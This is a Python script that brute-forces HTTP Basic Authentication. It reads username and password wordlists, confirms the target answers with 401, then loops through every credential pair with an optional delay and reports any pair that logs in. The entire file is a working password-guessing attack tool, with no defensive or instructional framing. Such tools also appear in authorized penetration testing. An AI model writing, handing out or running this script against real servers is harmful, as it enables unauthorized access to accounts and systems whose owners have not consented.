import requests
import time
from requests.auth import HTTPBasicAuth

def load_file(file_path):
    
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: {file_path} not found.")
        exit(1)

def is_basic_auth_enabled(url):
    
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 401:
            print("[+] Basic Authentication is enabled on the target.")
            return True
        elif response.status_code == 200:
            print("[-] No authentication required. The server allows public access.")
            return False
        else:
            print(f"[!] Unexpected response: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error connecting to the target: {e}")
        exit(1)

def brute_force_basic_auth(url, usernames, passwords, delay):
    
    for username in usernames:
        for password in passwords:
            print(f"Trying: {username}:{password}")
            try:
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
                if response.status_code == 200:
                    print(f"[+] Success! Username: {username}, Password: {password}")
                    return True
                elif response.status_code == 401:
                    pass  
                else:
                    print(f"[!] Unexpected response: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")
            
            
            time.sleep(delay)
    
    print("[-] No valid credentials found.")
    return False

if __name__ == "__main__":
    
    username_file = input("Enter the path to the Username.txt file: ").strip()
    password_file = input("Enter the path to the Pass.txt file: ").strip()
    target_url = input("Enter the target URL with Basic Auth (e.g., http://localhost): ").strip()
    
    
    try:
        delay = float(input("Enter delay between requests (in seconds): ").strip())
        if delay < 0:
            raise ValueError("Delay cannot be negative.")
    except ValueError as e:
        print(f"Invalid input for delay: {e}")
        exit(1)

    
    usernames = load_file(username_file)
    passwords = load_file(password_file)

    
    if is_basic_auth_enabled(target_url):
        
        brute_force_basic_auth(target_url, usernames, passwords, delay)
    else:
        print("[-] Basic Authentication is not enabled on the target.")
